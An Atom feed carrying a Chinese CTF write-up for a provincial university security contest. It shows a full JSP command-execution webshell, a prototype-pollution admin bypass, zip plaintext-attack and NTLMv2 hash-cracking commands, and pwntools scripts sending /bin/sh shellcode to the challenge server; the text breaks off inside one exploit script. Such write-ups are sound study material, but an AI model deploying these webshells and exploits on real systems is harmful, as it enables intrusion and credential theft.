<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Dr0n&#39;s blog</title>
  
  <subtitle>人生何处不青山</subtitle>
  <link href="https://www.dr0n.top/atom.xml" rel="self"/>
  
  <link href="https://www.dr0n.top/"/>
  <updated>2024-11-03T13:50:38.375Z</updated>
  <id>https://www.dr0n.top/</id>
  
  <author>
    <name>dr0n</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>第七届浙江省大学生网络与信息安全竞赛预赛-WP</title>
    <link href="https://www.dr0n.top/posts/42d6129/"/>
    <id>https://www.dr0n.top/posts/42d6129/</id>
    <published>2024-11-02T09:00:00.000Z</published>
    <updated>2024-11-03T13:50:38.375Z</updated>
    
    <content type="html"><![CDATA[<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><h2 id="网安知识大挑战"><a href="#网安知识大挑战" class="headerlink" title="网安知识大挑战"></a>网安知识大挑战</h2><p>数据存储在js中</p><p><img src="/img/wp/2024/2024-zjss-cs-%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E5%A4%A7%E6%8C%91%E6%88%98-2.png"></p><p>aes解密得到flag</p><p><img src="/img/wp/2024/2024-zjss-cs-%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E5%A4%A7%E6%8C%91%E6%88%98-1.png"></p><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Base92 -&gt; Base85 -&gt; Base64 -&gt; Base62 -&gt; Base58 -&gt; Base45 -&gt; Base32<br></code></pre></td></tr></table></figure><p><code>DASCTF&#123;welcome_to_zjctf_2024&#125;</code></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="hack-memory"><a href="#hack-memory" class="headerlink" title="hack memory"></a>hack memory</h2><p>访问<code>/robot.txt</code>得到<code>/upload</code>路径</p><p>没有限制，直接上传一个小马</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*,java.io.*&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;%!<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">excuteCmd</span><span class="hljs-params">(String c)</span><br>&#123;<br>    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><span class="hljs-keyword">try</span><br>&#123;<br>    <span class="hljs-type">Process</span> <span class="hljs-variable">pro</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(c);<br>    <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">buf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(pro.getInputStream()));<br>    <span class="hljs-type">String</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">while</span> ((temp = buf.readLine()) != <span class="hljs-literal">null</span>)<br>    &#123;<br>        line.append(temp+<span class="hljs-string">&quot;\\n&quot;</span>);<br>    &#125;<br>    buf.close();<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception e)<br>&#123;<br>    line.append(e.getMessage());<br>&#125;<br><span class="hljs-keyword">return</span> line.toString();<br>&#125;<br>%&gt;<br>&lt;%<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;023&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>))&amp;&amp;!<span class="hljs-string">&quot;&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)))<br>&#123;<br>    out.println(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>+excuteCmd(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>))+<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    out.println(<span class="hljs-string">&quot;:-)&quot;</span>);<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>flag内容需要再base64一次</p><p><img src="/img/wp/2024/2024-zjss-cs-hack%20memory-1.png"></p><h2 id="easyjs"><a href="#easyjs" class="headerlink" title="easyjs"></a>easyjs</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> _ = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br><br><span class="hljs-comment">// 存储笔记的对象</span><br><span class="hljs-keyword">const</span> notes = &#123;&#125;;<br><br><span class="hljs-comment">// 创建新笔记</span><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/notes&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> noteId = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>    <span class="hljs-keyword">const</span> noteData = req.<span class="hljs-property">body</span>;<br><br>    <span class="hljs-keyword">if</span> (!noteId) &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Missing id&#x27;</span> &#125;);<br>    &#125;<br><br>    <span class="hljs-comment">// 使用lodash.merge，该版本存在原型链污染漏洞</span><br>    notes[noteId] = &#123;&#125;;<br>    _.<span class="hljs-title function_">merge</span>(notes[noteId], noteData);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Note prototype:&#x27;</span>, <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(notes[noteId]));<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Note properties:&#x27;</span>, notes[noteId]);<br>    res.<span class="hljs-title function_">json</span>(notes[noteId]);<br>&#125;);<br><br><span class="hljs-comment">// 获取笔记</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/notes/:id&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> noteId = req.<span class="hljs-property">params</span>.<span class="hljs-property">id</span>;<br><br>    <span class="hljs-keyword">if</span> (!notes[noteId]) &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Note not found&#x27;</span> &#125;);<br>    &#125;<br><br>    res.<span class="hljs-title function_">json</span>(notes[noteId]);<br>&#125;);<br><br><span class="hljs-comment">// 获取flag (仅管理员可访问)</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/flag&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> noteId = req.<span class="hljs-property">headers</span>[<span class="hljs-string">&#x27;note-id&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (!noteId || !notes[noteId]) &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Authentication required&#x27;</span> &#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!notes[noteId].<span class="hljs-property">isAdmin</span>) &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Admin access required&#x27;</span> &#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> flag = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>);<br>        res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">flag</span>: flag.<span class="hljs-title function_">trim</span>() &#125;);<br>    &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Error reading flag&#x27;</span> &#125;);<br>    &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">8000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server running on port 8000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>先创建一个笔记，isAdmin设为true</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;isAdmin&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-keyword">true</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024-zjss-cs-easyjs-1.png"></p><p>访问<code>/api/flag</code>的时候将note-id设为1即可得到flag</p><p><img src="/img/wp/2024/2024-zjss-cs-easyjs-2.png"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="RealSignin"><a href="#RealSignin" class="headerlink" title="RealSignin"></a>RealSignin</h2><p>图片尾数据<code>dEFfc1dGq1pxMgMWnihrMx9mewNgdvIWMvctrc</code></p><p>stegsolve 0通道得到base码表</p><p><code>ABCDEFGHIJKLMNabcdefghijklmnopqrstuvwxyzOPQRSTUVWXYZ0123456789+/</code></p><p>base64换表得到flag</p><p><img src="/img/wp/2024/2024-zjss-cs-RealSignin-1.png"></p><h2 id="机密文档"><a href="#机密文档" class="headerlink" title="机密文档"></a>机密文档</h2><p>简单爆破无果，尝试明文攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;the_secret_you_never_ever_know_hahahaha&quot;</span> &gt; plain.out<br>./bkcrack -C 1.zip -c the_secret_you_never_ever_know_hahahaha.zip -p plain.out -o 30 -x 0 504B030414000000<br><br>./bkcrack -C 1.zip -k b8edf1ff c1f93a7e f93d08e0 -U 2.zip dr0n1<br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024-zjss-cs-%E6%9C%BA%E5%AF%86%E6%96%87%E6%A1%A3-1.png"></p><p>解压后得到一个dom文件，其中有一个名为key的vba宏代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs vba">Sub key()<br>    Dim decValues As Variant<br>    Dim str As String<br>    Dim result As String<br>    Dim i As Integer<br>    Dim xorValue As Integer<br><br>    decValues = Array(26, 25, 28, 0, 16, 1, 74, 75, 45, 29, 19, 49, 61, 60, 3)<br>    str = &quot;outguess&quot;<br>    result = &quot;&quot;<br><br>    For i = LBound(decValues) To UBound(decValues)<br>        xorValue = decValues(i) Xor Asc(Mid(str, (i Mod Len(str)) + 1, 1))<br>        result = result &amp; Chr(xorValue)<br>    Next i<br><br>End Sub<br></code></pre></td></tr></table></figure><p>解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">26</span>, <span class="hljs-number">25</span>, <span class="hljs-number">28</span>, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-number">1</span>, <span class="hljs-number">74</span>, <span class="hljs-number">75</span>, <span class="hljs-number">45</span>, <span class="hljs-number">29</span>, <span class="hljs-number">19</span>, <span class="hljs-number">49</span>, <span class="hljs-number">61</span>, <span class="hljs-number">60</span>, <span class="hljs-number">3</span>]<br>b=<span class="hljs-string">b&#x27;outguess&#x27;</span><br>d=[]<br><span class="hljs-keyword">for</span> i,k <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(a):<br>    d.append(b[i%<span class="hljs-built_in">len</span>(b)]^k)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(d))<br></code></pre></td></tr></table></figure><p>得到key: ulhged98BhgVHYp</p><p>根据vba中的<code>outguess</code>提示，对文件中的图片使用outguess解密后得到flag</p><p><code>outguess -k &#39;ulhged98BhgVHYp&#39; -r image1.jpg -t 1.txt</code></p><h2 id="EZtraffic"><a href="#EZtraffic" class="headerlink" title="EZtraffic"></a>EZtraffic</h2><p>导出SMB对象</p><p>导出的压缩包注释中得到<code>NTLM v2 plaintext + \d&#123;5&#125;</code></p><p>那么根据NTLM v2的格式拼接后爆破即可</p><p><code>username::domain:challenge:HMAC-MD5:blob</code></p><p>在流量包中对应的数据如下</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">User name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">rockyou</span><br><span class="hljs-attribute">Domain name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">MicrosoftAccount</span><br><span class="hljs-attribute">Server Challenge</span><span class="hljs-punctuation">:</span> <span class="hljs-string">4936df20962cae6d</span><br><span class="hljs-attribute">NTproofStr</span><span class="hljs-punctuation">:</span> <span class="hljs-string">db12ced50faf52f141636e80205e8f28</span><br><span class="hljs-attribute">NTLMv2 Response</span><span class="hljs-punctuation">:</span> <span class="hljs-string">01010000000000003604281b951fdb017b4045aa008508eb0000000002001e00440042004500440036004200350041002d0035003100430032002d00340001001e00440042004500440036004200350041002d0035003100430032002d00340004004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d0064006400320062003500370030006400350030003900360003004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d00640064003200620035003700300064003500300039003600070008003604281b951fdb01060004000200000008003000300000000000000001000000002000008029a5d8256e5c2762f439df5c06f3bc411fb0faeb3a6fa52d9273c57b09f2d10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e0031002e00380031000000000000000000</span><br><br>//HMAC-MD5对应数据包中的NTProofStr<br>//blob对应数据包中Response去掉NTProofStr的后半部分<br></code></pre></td></tr></table></figure><p><code>rockyou::MicrosoftAccount:4936df20962cae6d:db12ced50faf52f141636e80205e8f28:01010000000000003604281b951fdb017b4045aa008508eb0000000002001e00440042004500440036004200350041002d0035003100430032002d00340001001e00440042004500440036004200350041002d0035003100430032002d00340004004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d0064006400320062003500370030006400350030003900360003004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d00640064003200620035003700300064003500300039003600070008003604281b951fdb01060004000200000008003000300000000000000001000000002000008029a5d8256e5c2762f439df5c06f3bc411fb0faeb3a6fa52d9273c57b09f2d10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e0031002e00380031000000000000000000</code></p><p>使用<code>hashcat</code>爆破</p><p><code>hashcat -m 5600 1.txt rockyou.txt --show</code></p><p><img src="/img/wp/2024/2024-zjss-cs-EZtraffic-1.png"></p><p>掩码爆破得到<code>haticehatice12580</code></p><p>解压后是100张小图片，使用gaps的效果不好，猜测有地方存储了拼图顺序</p><p>发现每张图片的Red 0通道保存有一张二维码</p><p><img src="/img/wp/2024/2024-zjss-cs-EZtraffic-2.png"></p><p>写脚本排序并拼图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> zxing<br><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_image_to_qrcode</span>(<span class="hljs-params">image_path</span>):<br>    <span class="hljs-comment"># 读取图片Red 0通道数据</span><br>    img = Image.<span class="hljs-built_in">open</span>(image_path)<br>    w, h = img.size<br>    rgb = [<span class="hljs-string">&#x27;&#x27;</span>]<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>            data = img.getpixel((i, j))<br>            rgb[<span class="hljs-number">0</span>] += <span class="hljs-built_in">str</span>(data[<span class="hljs-number">0</span>] % <span class="hljs-number">2</span>)<br><br>    <span class="hljs-comment"># 转成二维码</span><br>    img = Image.new(<span class="hljs-string">&#x27;1&#x27;</span>, (w, h))<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>            img.putpixel((i, j), <span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">0</span>][j * w + i]))<br>    img.save(<span class="hljs-string">&#x27;./out/&#x27;</span> + image_path.split(<span class="hljs-string">&#x27;\\&#x27;</span>)[-<span class="hljs-number">1</span>])<br><br>    <span class="hljs-comment"># 扫描二维码</span><br>    reader = zxing.BarCodeReader()<br>    barcode = reader.decode(<span class="hljs-string">&#x27;./out/&#x27;</span> + image_path.split(<span class="hljs-string">&#x27;\\&#x27;</span>)[-<span class="hljs-number">1</span>])<br><br>    <span class="hljs-keyword">return</span> image_path, barcode.parsed<br><br><br>path = <span class="hljs-string">&quot;./final_out&quot;</span><br>names = []<br><span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(path):<br>    <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:<br>        names.append(os.path.join(root, file))<br><br>results = []<br><span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> names:<br>    results.append(process_image_to_qrcode(name))<br>    <span class="hljs-built_in">print</span>(results[-<span class="hljs-number">1</span>])<br><br><br><span class="hljs-comment"># 根据二维码内容排序，将图片合并 10*10</span><br>results.sort(key=<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">int</span>(x[<span class="hljs-number">1</span>]))<br><span class="hljs-built_in">print</span>(results)<br>width_i = <span class="hljs-number">50</span><br>height_i = <span class="hljs-number">50</span><br>line_max = <span class="hljs-number">10</span><br>row_max = <span class="hljs-number">10</span><br>pic_max = line_max * row_max<br>toImage = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (width_i * line_max, height_i * row_max))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(pic_max):<br>    pic_path = results[i][<span class="hljs-number">0</span>]<br>    pic_fole_head = Image.<span class="hljs-built_in">open</span>(pic_path)<br>    tmppic = pic_fole_head.resize((width_i, height_i))<br>    loc = (<span class="hljs-built_in">int</span>(i % line_max * width_i), <span class="hljs-built_in">int</span>(i // line_max * height_i))<br>    toImage.paste(tmppic, loc)<br>toImage.save(<span class="hljs-string">&#x27;merged.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024-zjss-cs-EZtraffic-3.png"></p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;pop rcx</span><br><span class="hljs-string">xchg rdi,rdx</span><br><span class="hljs-string">sub rcx,0x44</span><br><span class="hljs-string">push rcx</span><br><span class="hljs-string">ret</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(asm(shellcode)))<br><span class="hljs-comment">#exit()</span><br><span class="hljs-comment">#p=process(&quot;./shellcode&quot;)</span><br>p=remote(<span class="hljs-string">&quot;139.155.126.78&quot;</span>,<span class="hljs-string">&quot;32343&quot;</span>)<br><br><span class="hljs-comment">#gdb.attach(p,&#x27;bp $rebase(0x1424)\nc&#x27;)</span><br>pause()<br>p.send(asm(shellcode))<br><br>pause()<br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rcx,rax</span><br><span class="hljs-string">    add rcx,0x100</span><br><span class="hljs-string">    mov rbx,0x50f</span><br><span class="hljs-string">    mov  word ptr [rcx],bx</span><br><span class="hljs-string">    push 0x68</span><br><span class="hljs-string">    mov rax, 0x732f2f2f6e69622f</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    push 0x1010101 ^ 0x6873</span><br><span class="hljs-string">    xor dword ptr [rsp], 0x1010101</span><br><span class="hljs-string">    xor esi, esi /* 0 */</span><br><span class="hljs-string">    push rsi /* null terminate */</span><br><span class="hljs-string">    push 8</span><br><span class="hljs-string">    pop rsi</span><br><span class="hljs-string">    add rsi, rsp</span><br><span class="hljs-string">    push rsi /* &#x27;sh\x00&#x27; */</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    xor edx, edx /* 0 */</span><br><span class="hljs-string">    push 0x3b</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    jmp rcx</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>p.send(asm(shellcode))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="apple"><a href="#apple" class="headerlink" title="apple"></a>apple</h2><p>存在数组越界可修改stdout的数据，利用io结构体获取shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    p.sendafter(<span 